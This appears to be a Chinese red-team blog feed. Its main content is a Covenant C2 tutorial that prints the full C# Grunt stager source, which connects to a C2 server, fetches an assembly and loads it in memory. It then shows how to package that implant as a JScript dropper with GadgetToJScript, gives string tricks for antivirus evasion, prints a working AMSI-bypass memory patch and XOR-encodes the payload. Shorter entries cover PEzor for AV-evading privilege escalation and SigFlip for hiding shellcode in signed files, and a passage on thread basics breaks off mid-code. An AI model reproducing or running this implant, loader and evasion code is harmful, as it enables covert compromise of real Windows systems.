Encoding.UTF8.GetBytes(rsa.ToXmlString(false));                byte[] EncryptedRSAPublicKey = SetupAESKey.CreateEncryptor().TransformFinalBlock(RSAPublicKeyBytes, 0, RSAPublicKeyBytes.Length);                byte[] hash = hmac.ComputeHash(EncryptedRSAPublicKey);                string Stage0Body = String.Format(MessageFormat, aGUID + GUID, "0", "", Convert.ToBase64String(SetupAESKey.IV), Convert.ToBase64String(EncryptedRSAPublicKey), Convert.ToBase64String(hash));                ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;                ServicePointManager.ServerCertificateValidationCallback = (sender, cert, chain, errors) =&gt;                {                    bool valid = true;                    if (UseCertPinning &amp;&amp; CovenantCertHash != "")                    {                        valid = cert.GetCertHashString() == CovenantCertHash;                    }                    if (valid &amp;&amp; ValidateCert)                    {                        valid = errors == System.Net.Security.SslPolicyErrors.None;                    }                    return valid;                };                string transformedResponse = MessageTransform.Transform(Encoding.UTF8.GetBytes(Stage0Body));                CookieWebClient wc = null;                string Stage0Response = "";                wc = new CookieWebClient();                wc.UseDefaultCredentials = true;                wc.Proxy = WebRequest.DefaultWebProxy;                wc.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;                string CovenantURI = "";                foreach (string uri in CovenantURIs)                {                    try                    {                        for (int i = 0; i &lt; ProfileHttpHeaderValues.Count; i++)                        {                            if (ProfileHttpHeaderNames[i] == "Cookie")                            {                                wc.SetCookies(new Uri(uri), ProfileHttpHeaderValues[i].Replace(";", ",").Replace("{GUID}", ""));                            }                            else                            {                                wc.Headers.Set(ProfileHttpHeaderNames[i].Replace("{GUID}", ""), ProfileHttpHeaderValues[i].Replace("{GUID}", ""));                            }                        }                        wc.DownloadString(uri + ProfileHttpUrls[random.Next(ProfileHttpUrls.Count)].Replace("{GUID}", ""));                        CovenantURI = uri;                    }                    catch                    {                        continue;                    }                }                for (int i = 0; i &lt; ProfileHttpHeaderValues.Count; i++)                {                    if (ProfileHttpHeaderNames[i] == "Cookie")                    {                        wc.SetCookies(new Uri(CovenantURI), ProfileHttpHeaderValues[i].Replace(";", ",").Replace("{GUID}", GUID));                    }                    else                    {                        wc.Headers.Set(ProfileHttpHeaderNames[i].Replace("{GUID}", GUID), ProfileHttpHeaderValues[i].Replace("{GUID}", GUID));                    }                }                Stage0Response = wc.UploadString(CovenantURI + ProfileHttpUrls[random.Next(ProfileHttpUrls.Count)].Replace("{GUID}", GUID), String.Format(ProfileHttpPostRequest, transformedResponse));                string extracted = Parse(Stage0Response, ProfileHttpPostResponse)[0];                extracted = Encoding.UTF8.GetString(MessageTransform.Invert(extracted));                List&lt;string&gt; parsed = Parse(extracted, MessageFormat);                string iv64str = parsed[3];                string message64str = parsed[4];                string hash64str = parsed[5];                byte[] messageBytes = Convert.FromBase64String(message64str);                if (hash64str != Convert.ToBase64String(hmac.ComputeHash(messageBytes))) { return; }                SetupAESKey.IV = Convert.FromBase64String(iv64str);                byte[] PartiallyDecrypted = SetupAESKey.CreateDecryptor().TransformFinalBlock(messageBytes, 0, messageBytes.Length);                byte[] FullyDecrypted = rsa.Decrypt(PartiallyDecrypted, true);                Aes SessionKey = Aes.Create();                SessionKey.Mode = CipherMode.CBC;                SessionKey.Padding = PaddingMode.PKCS7;                SessionKey.Key = FullyDecrypted;                SessionKey.GenerateIV();                hmac = new HMACSHA256(SessionKey.Key);                byte[] challenge1 = new byte[4];                RandomNumberGenerator rng = RandomNumberGenerator.Create();                rng.GetBytes(challenge1);                byte[] EncryptedChallenge1 = SessionKey.CreateEncryptor().TransformFinalBlock(challenge1, 0, challenge1.Length);                hash = hmac.ComputeHash(EncryptedChallenge1);                string Stage1Body = String.Format(MessageFormat, GUID, "1", "", Convert.ToBase64String(SessionKey.IV), Convert.ToBase64String(EncryptedChallenge1), Convert.ToBase64String(hash));                transformedResponse = MessageTransform.Transform(Encoding.UTF8.GetBytes(Stage1Body));                string Stage1Response = "";                for (int i = 0; i &lt; ProfileHttpHeaderValues.Count; i++)                {                    if (ProfileHttpHeaderNames[i] == "Cookie")                    {                        wc.SetCookies(new Uri(CovenantURI), ProfileHttpHeaderValues[i].Replace(";", ",").Replace("{GUID}", GUID));                    }                    else                    {                        wc.Headers.Set(ProfileHttpHeaderNames[i].Replace("{GUID}", GUID), ProfileHttpHeaderValues[i].Replace("{GUID}", GUID));                    }                }                Stage1Response = wc.UploadString(CovenantURI + ProfileHttpUrls[random.Next(ProfileHttpUrls.Count)].Replace("{GUID}", GUID), String.Format(ProfileHttpPostRequest, transformedResponse));                extracted = Parse(Stage1Response, ProfileHttpPostResponse)[0];                extracted = Encoding.UTF8.GetString(MessageTransform.Invert(extracted));                parsed = Parse(extracted, MessageFormat);                iv64str = parsed[3];                message64str = parsed[4];                hash64str = parsed[5];                messageBytes = Convert.FromBase64String(message64str);                if (hash64str != Convert.ToBase64String(hmac.ComputeHash(messageBytes))) { return; }                SessionKey.IV = Convert.FromBase64String(iv64str);                byte[] DecryptedChallenges = SessionKey.CreateDecryptor().TransformFinalBlock(messageBytes, 0, messageBytes.Length);                byte[] challenge1Test = new byte[4];                byte[] challenge2 = new byte[4];                Buffer.BlockCopy(DecryptedChallenges, 0, challenge1Test, 0, 4);                Buffer.BlockCopy(DecryptedChallenges, 4, challenge2, 0, 4);                if (Convert.ToBase64String(challenge1) != Convert.ToBase64String(challenge1Test)) { return; }                SessionKey.GenerateIV();                byte[] EncryptedChallenge2 = SessionKey.CreateEncryptor().TransformFinalBlock(challenge2, 0, challenge2.Length);                hash = hmac.ComputeHash(EncryptedChallenge2);                string Stage2Body = String.Format(MessageFormat, GUID, "2", "", Convert.ToBase64String(SessionKey.IV), Convert.ToBase64String(EncryptedChallenge2), Convert.ToBase64String(hash));                transformedResponse = MessageTransform.Transform(Encoding.UTF8.GetBytes(Stage2Body));                string Stage2Response = "";                for (int i = 0; i &lt; ProfileHttpHeaderValues.Count; i++)                {                    if (ProfileHttpHeaderNames[i] == "Cookie")                    {                        wc.SetCookies(new Uri(CovenantURI), ProfileHttpHeaderValues[i].Replace(";", ",").Replace("{GUID}", GUID));                    }                    else                    {                        wc.Headers.Set(ProfileHttpHeaderNames[i].Replace("{GUID}", GUID), ProfileHttpHeaderValues[i].Replace("{GUID}", GUID));                    }                }                Stage2Response = wc.UploadString(CovenantURI + ProfileHttpUrls[random.Next(ProfileHttpUrls.Count)].Replace("{GUID}", GUID), String.Format(ProfileHttpPostRequest, transformedResponse));                extracted = Parse(Stage2Response, ProfileHttpPostResponse)[0];                extracted = Encoding.UTF8.GetString(MessageTransform.Invert(extracted));                parsed = Parse(extracted, MessageFormat);                iv64str = parsed[3];                message64str = parsed[4];                hash64str = parsed[5];                messageBytes = Convert.FromBase64String(message64str);                if (hash64str != Convert.ToBase64String(hmac.ComputeHash(messageBytes))) { return; }                SessionKey.IV = Convert.FromBase64String(iv64str);                byte[] DecryptedAssembly = SessionKey.CreateDecryptor().TransformFinalBlock(messageBytes, 0, messageBytes.Length);                Assembly gruntAssembly = Assembly.Load(DecryptedAssembly);                gruntAssembly.GetTypes()[0].GetMethods()[0].Invoke(null, new Object[] { CovenantURI, CovenantCertHash, GUID, SessionKey });            }            catch (Exception e) { Console.Error.WriteLine(e.Message + Environment.NewLine + e.StackTrace); }        }        public class CookieWebClient : WebClient        {            public CookieContainer CookieContainer { get; private set; }            public CookieWebClient()            {                this.CookieContainer = new CookieContainer();            }            public void SetCookies(Uri uri, string cookies)            {                this.CookieContainer.SetCookies(uri, cookies);            }            protected override WebRequest GetWebRequest(Uri address)            {                var request = base.GetWebRequest(address) as HttpWebRequest;                if (request == null) return base.GetWebRequest(address);                request.CookieContainer = CookieContainer;                return request;            }        }        public static List&lt;string&gt; Parse(string data, string format)        {            format = Regex.Escape(format).Replace("\\{", "{").Replace("{{", "{").Replace("}}", "}");            if (format.Contains("{0}")) { format = format.Replace("{0}", "(?'group0'.*)"); }            if (format.Contains("{1}")) { format = format.Replace("{1}", "(?'group1'.*)"); }            if (format.Contains("{2}")) { format = format.Replace("{2}", "(?'group2'.*)"); }            if (format.Contains("{3}")) { format = format.Replace("{3}", "(?'group3'.*)"); }            if (format.Contains("{4}")) { format = format.Replace("{4}", "(?'group4'.*)"); }            if (format.Contains("{5}")) { format = format.Replace("{5}", "(?'group5'.*)"); }            Match match = new Regex(format).Match(data);            List&lt;string&gt; matches = new List&lt;string&gt;();            if (match.Groups["group0"] != null) { matches.Add(match.Groups["group0"].Value); }            if (match.Groups["group1"] != null) { matches.Add(match.Groups["group1"].Value); }            if (match.Groups["group2"] != null) { matches.Add(match.Groups["group2"].Value); }            if (match.Groups["group3"] != null) { matches.Add(match.Groups["group3"].Value); }            if (match.Groups["group4"] != null) { matches.Add(match.Groups["group4"].Value); }            if (match.Groups["group5"] != null) { matches.Add(match.Groups["group5"].Value); }            return matches;        }        public static class MessageTransform{    public static string Transform(byte[] bytes)    {        return System.Convert.ToBase64String(bytes);    }    public static byte[] Invert(string str) {        return System.Convert.FromBase64String(str);    }}    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注：这里可以把路径简写 看着方便点</p><pre class="line-numbers language-none"><code class="language-none">prompt studycd 查看目录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>打开vs studio开发者模式</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911677.png" alt="image-20211117170511975"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911678.png" alt="image-20211116235559754"></p><p>切换目录</p><p>编译cs文件</p><pre class="line-numbers language-none"><code class="language-none">csc /t:exe Grunt.cs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911679.png" alt="image-20211117180733672"></p><p>执行一下 </p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911680.png" alt="image-20211117180858385"></p><p>上线了</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911681.png" alt="image-20211117180934799"></p><h1 id="GadgetToJScript"><a href="#GadgetToJScript" class="headerlink" title="GadgetToJScript"></a>GadgetToJScript</h1><h2 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h2><p>GadgetToJScript是一个Csharp的项目：<a href="https://github.com/med0x2e/GadgetToJScript">https://github.com/med0x2e/GadgetToJScript</a></p><p>Covenant是一个<code>.NET</code>开发的C2(Command and  Control)框架，旨在突出<code>.NET</code>的攻击面，并充当红队成员的协作命令和控制平台</p><p>使用<code>.NET  Core</code>的开发环境，不仅支持Linux，MacOS和Windows，还支持docker容器</p><p>Covenant是支持动态编译，能够将输入的C#代码上传至C2 Server，获得编译后的文件并使用Assembly.Load()从内存进行加载</p><p>GadgetToJscript用于生成<code>.NET</code>序列化的工具，当使用基于JS/VBS/VBA脚本中的BinaryFormatter反序列化时，该工具可以触发<code>.NET</code>程序集加载/执行，同时相比James Forshaw的DotNetToJScript添加了绕过.Net 4.8+阻止<code>Assembly.Load</code>的功能。</p><p>两者结合学习</p><h2 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h2><p>下载的GadhetToJscript项目用Vistual Studio 2019打开</p><p>GadgetToJscript的编译过程属于动态编译，里面涉及到很多DLL的引用</p><p>定位到TestAssemblelyLoader.cs文件</p><p>编译生成GadgetToJScript.exe</p><p>由于grunt.cs代码中有两个命名空间不被包含在System.dll里</p><pre class="line-numbers language-none"><code class="language-none">1、System.Linq;2、System.IO.Pipes;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p> 它们在System.Core.dll里，所以调用的时候我们需要手动添加System.Core.dll，在命令行输入：</p><pre class="line-numbers language-none"><code class="language-none">GadgetToJScript.exe -w js -f Grunt.cs -d System.Core.dll -o matrix-w 是输出文件的格式-d 是需要添加的dll，如果有多个可以用逗号隔开-f 是我们引入的csharp文件，这里我们选择刚才的 grunt.cs 测试-o 是输出的文件名然后我们会得到名为matrix.js的文件，打开matrix.js文件。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911682.png" alt="image-20211119221843448"></p><p>分析一下这个js文件</p><pre class="line-numbers language-none"><code class="language-none">stage_1:为了绕过Win10中对Assembly.load的限制stage_2:加载的核心程序集<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911683.png" alt="image-20211119221910019"></p><p>测试js文件，运行</p><pre class="line-numbers language-none"><code class="language-none">cscript matrix.js<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="JS文件的混淆免杀Tips"><a href="#JS文件的混淆免杀Tips" class="headerlink" title="JS文件的混淆免杀Tips"></a>JS文件的混淆免杀Tips</h2><p>杀软一般标记的是变量名、字符串</p><p>1.针对字符串，可以把双引号和单引号去掉</p><p>比如</p><pre class="line-numbers language-none"><code class="language-none">原先("aaa")转换成(/aaa/.source)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2.针对一些转义问题</p><p>原先 双引号中的<code>\\</code>就要替换成<code>\</code></p><p>举例</p><pre class="line-numbers language-none"><code class="language-none">原先的路径("D:\\7-Zip\\1\\")转换成(/D:\7-Zip\1/.source + '\\')<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911684.png" alt="image-20211119222704258"></p><h2 id="内存修补Bypass-AMSI"><a href="#内存修补Bypass-AMSI" class="headerlink" title="内存修补Bypass AMSI"></a>内存修补Bypass AMSI</h2><p>主要思路是通过找到内存中AmsiScanBuffer函数的位置，然后通过patch，让AmsiScanBuffer这个函数不再继续运行，直接在函数的开始让它返回一个0</p><p>后来微软进行了一次更新对<code>.NET</code>程序集AmsiScanBuffer的扫描结果必须返回一个有效值</p><p><code>0xb8, 0x57, 0x00, 0x07, 0x80</code>，同时要加上0xC3（0xC3是return）</p><p>PatchAmsi.cs代码如下：</p><pre class="line-numbers language-none"><code class="language-none">using System;using System.Collections.Generic;using System.Linq;using System.Text;using System.Reflection;using System.Runtime.InteropServices;namespace AMSI{  public class Program    {        [DllImport("kernel32")]        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);        [DllImport("kernel32")]        private static extern IntPtr LoadLibrary(string name);        [DllImport("kernel32")]        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);               static void Main(string[] args)        {            new Program();        }        public Program()        {            Patch();        }        public static void Patch()        {            // Console.WriteLine("-- AMSI Patching");            //Console.WriteLine("-- Paul (@am0nsec)\n");            // Get the DllCanUnload function address            IntPtr hModule = LoadLibrary("amsi.dll");            //Console.WriteLine("[+] AMSI DLL handle: " + hModule);            IntPtr dllCanUnloadNowAddress = GetProcAddress(hModule, "DllCanUnloadNow");//AmsiScanBuffer            //Console.WriteLine("[+] DllCanUnloadNow address: " + dllCanUnloadNowAddress);            // Dynamically get the address of the function to patch            byte[] egg = { };            if (IntPtr.Size == 8)            {                egg = new byte[] {                    0x4C, 0x8B, 0xDC,       // mov     r11,rsp                    0x49, 0x89, 0x5B, 0x08, // mov     qword ptr [r11+8],rbx                    0x49, 0x89, 0x6B, 0x10, // mov     qword ptr [r11+10h],rbp                    0x49, 0x89, 0x73, 0x18, // mov     qword ptr [r11+18h],rsi                    0x57,                   // push    rdi                    0x41, 0x56,             // push    r14                    0x41, 0x57,             // push    r15                    0x48, 0x83, 0xEC, 0x70  // sub     rsp,70h                };            }            else            {                egg = new byte[] {                    0x8B, 0xFF,             // mov     edi,edi                    0x55,                   // push    ebp                    0x8B, 0xEC,             // mov     ebp,esp                    0x83, 0xEC, 0x18,       // sub     esp,18h                    0x53,                   // push    ebx                    0x56                    // push    esi                };            }            IntPtr address = FindAddress(dllCanUnloadNowAddress, egg);            // Console.WriteLine("[+] Targeted address: " + address);            // Change the memory protection of the memory region             // PAGE_READWRITE = 0x04            uint oldProtectionBuffer = 0;            VirtualProtect(address, (UIntPtr)2, 4, out oldProtectionBuffer);            // Patch the function            byte[] patch = { 0xb8, 0x57, 0x00, 0x07, 0x80, 0xC3 };            Marshal.Copy(patch, 0, address, 6);            // Reinitialise the memory protection of the memory region            uint a = 0;            VirtualProtect(address, (UIntPtr)2, oldProtectionBuffer, out a);        }        private static IntPtr FindAddress(IntPtr address, byte[] egg)        {            while (true)            {                int count = 0;                while (true)                {                    address = IntPtr.Add(address, 1);                    if (Marshal.ReadByte(address) == (byte)egg.GetValue(count))                    {                        count++;                        if (count == egg.Length)                            return IntPtr.Subtract(address, egg.Length - 1);                    }                    else                    {                        break;                    }                }            }        }    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注：第一:代码中不能直接出现<code>AmsiScanBuffer</code>的字符串，否则会被amsi识别，所以替换成<code>DllCanUnloadNow</code></p><p>用egg hunt的方式，以<code>DllCanUnloadNow</code>的函数地址为基址寻找AmsiScanBuffer函数的地址，再patch</p><p>第二:因为微软的更新，使得对<code>.net  Assembly.load</code>的程序集扫描结果必须返回一个有效值，所以替换为<code>0xb8,0x57,0x00,0x07,0x80</code>后再加上<code>return  0xC3</code></p><p>编译一下</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911685.png" alt="image-20211119232115873"></p><p>执行一下</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911686.png" alt="image-20211119232136876"></p><p>上WinDbg调试看看是否成功 Bypass Amsi</p><p>File-Attach</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911687.png" alt="image-20211119232218285"></p><p>定位到amsi 查看Patch是否成功</p><h2 id="两者结合"><a href="#两者结合" class="headerlink" title="两者结合"></a>两者结合</h2><p>以Grunt.exe作为例子</p><p>1.把exe读取到一个数组中</p><pre class="line-numbers language-none"><code class="language-none">[byte[]]$rawbytes = [System.IO.File]::ReadAllBytes("C:\Users\12550\Desktop\知识\项目学习\GadgetToJScript\GadgetToJScript-1.0\GadgetToJScript\bin\x64\Release\Grunt.exe")<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2.查看exe的字符串大小</p><pre class="line-numbers language-none"><code class="language-none">$rawbytes.length<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911688.png" alt="image-20211119230129292"></p><p>3.简单异或0x77</p><pre class="line-numbers language-none"><code class="language-none">for ($i = 0; $i -lt $rawbytes.Length; $i++){$rawbytes[$i] = $rawbytes[$i] -bxor 0x77}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911689.png" alt="image-20211119230229026"></p><p>4.base64编码一哈 并复制到剪切板</p><pre class="line-numbers language-none"><code class="language-none">[System.Convert]::ToBase64String($rawbytes) | clip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911690.png" alt="image-20211119230303563"></p><p>放到PatchAmsi.cs文件中</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911691.png" alt="image-20211119224900660"></p><p>注意这里的<code>Patch();</code></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911692.png" alt="image-20211119230531276"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111231911693.png" alt="image-20211119230839529"></p><p>编译测试成功后命令行运行：</p><pre class="line-numbers language-none"><code class="language-none">GadgetToJScript.exe -w js -d System.Core.dll -f PatchASB.cs -o PatchASB<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>测试js文件，运行</p><pre class="line-numbers language-none"><code class="language-none">cscript matrix.js<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ok！ 就到这里</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Covenant是一个<code>.NET</code>命令和控制框架，二次开发可扩展性不比其他的C2差</p><p>分享者才是学习中最大的受益者！</p><p>希望可以帮到各位师傅</p>]]></content>
      
      
      <categories>
          
          <category> C2学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 开源C2:Covenant学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PEzor</title>
      <link href="/2021/10/28/pezor/"/>
      <url>/2021/10/28/pezor/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>下载地址：<a href="https://github.com/phra/PEzor">https://github.com/phra/PEzor</a></p><p>一个C语言写的项目</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><pre class="line-numbers language-none"><code class="language-none">git clone https://github.com/phra/PEzor.git cd PEzor sudo bash install.sh bash PEzor.sh -h<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111261335387.png" alt="image-20211115132356038"></p><p>需要设置一下go代理</p><pre class="line-numbers language-none"><code class="language-none">go env -w GOPROXY=https://goproxy.cn<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111261335906.png" alt="image-20211115132236179"></p><pre class="line-numbers language-none"><code class="language-none">export PATH=$PATH:~/go/bin/:/root/桌面/PEzor-master:/root/桌面/PEzor-master/deps/donut/:/root/桌面/PEzor-master/deps/wclang/_prefix_PEzor_/bin/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>可以将提权exe转换为bof，然后远程加载，过杀软提权</p><pre class="line-numbers language-none"><code class="language-none">bash PEzor.sh -format=bof -cleanup /root/ppid.exe -z 2bash PEzor.sh -format=bof /root/ppid.exe -z 2 -pinline-execute C:\Users\12550\Desktop\cs4.1\123.o<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Github项目学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PEzor </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SigFlip</title>
      <link href="/2021/10/28/sigflip/"/>
      <url>/2021/10/28/sigflip/</url>
      
        <content type="html"><![CDATA[<h2 id="下载地址："><a href="#下载地址：" class="headerlink" title="下载地址："></a>下载地址：</h2><p>一个C#的项目</p><p><a href="https://github.com/med0x2e/SigFlip">https://github.com/med0x2e/SigFlip</a></p><h2 id="项目用途"><a href="#项目用途" class="headerlink" title="项目用途"></a>项目用途</h2><p>一个在PE文件中添加shellcode却不会破坏PE签名的项目</p><p>默认loader部分用的是远程线程注入，会被wdf杀，自己改一下</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>这类项目多用于维权等，因为有数签</p>]]></content>
      
      
      <categories>
          
          <category> Github项目学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SigFlip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>线程-基础篇(一)</title>
      <link href="/2021/10/28/xian-cheng-ji-chu-pian/"/>
      <url>/2021/10/28/xian-cheng-ji-chu-pian/</url>
      
        <content type="html"><![CDATA[<h2 id="线程和进程的关系"><a href="#线程和进程的关系" class="headerlink" title="线程和进程的关系"></a>线程和进程的关系</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111261318887.png" alt="image-20211123222829943"></p><h2 id="主线程"><a href="#主线程" class="headerlink" title="主线程"></a>主线程</h2><p>1.子线程由主线程所产生</p><p>2.主线程由系统所产生</p><p>3.线程运行在进程当中</p><p>4.内存是共享的</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111261318260.png" alt="image-20211123222845686"></p><h2 id="进程-线程-的组成"><a href="#进程-线程-的组成" class="headerlink" title="进程/线程 的组成"></a>进程/线程 的组成</h2><p>1.进程是用来提供资源的，对资源进行监测、记录</p><p>2.线程存储临时变量，用来执行程序</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111261318174.png" alt="image-20211123223055537"></p><h2 id="线程小科普"><a href="#线程小科普" class="headerlink" title="线程小科普"></a>线程小科普</h2><p>1.同等情况，优先使用线程解决问题</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111261318762.png" alt="image-20211123223251631"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111261319231.png" alt="image-20211123223403378"></p><h2 id="线程的生命周期"><a href="#线程的生命周期" class="headerlink" title="线程的生命周期"></a>线程的生命周期</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111261318283.png" alt="image-20211123223633818"></p><h2 id="创建线程"><a href="#创建线程" class="headerlink" title="创建线程"></a>创建线程</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111261318469.png" alt="image-20211123223737304"></p><pre class="line-numbers language-none"><code class="language-none">HANDLE CreateThread(    LPSECURITY_ATTRIBUTES lpThreadAttributes, //线程安全属性    DWORD dwStackSize, //线程堆栈大小    LPTHREAD_START_ROUTINE lpStartAddress, //线程函数地址    LPVOID lpParameter, //线程函数参数    DWORD dwCreationFlags, //指定线程是否立即启动,挂起    DWORD* lpThreadId //存储线程ID号)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看第一个参数，它是结构体指针</p><pre class="line-numbers language-none"><code class="language-none">SECURITY_ATTRIBUTES sa;sa.nLength = sizeof(sa);sa.lpSecurityDescriptor = NULL;sa.bInheritHandle = TRUE; //设置句柄可以继承<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>句柄h可以被子进程继承 </p><pre class="line-numbers language-none"><code class="language-none">HANDLE h = CreateThread(&amp;sa, ……)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>一个简单的例子 打印效果是随机的</p><pre class="line-numbers language-none"><code class="language-none">DWORD WINAPI ThreadPro(LPVOID lpParam);int main(int argc, char *argv[]){    HANDLE hThread;    DWORD dwThreadId;    hThread = CreateThread(    NULL, //默认安全属性    NULL, //默认堆栈大小    ThreadPro, //线程入口地址    NULL, //传给函数的参数    0, //指定线程立即运行    &amp;dwThreadId //线程ID号);    for(int i = 0; i &lt; 4; i++) //循环打印4次    {        printf("hello\n");    }    CloseHandle(hThread); //关闭线程句柄    system("pause");    return 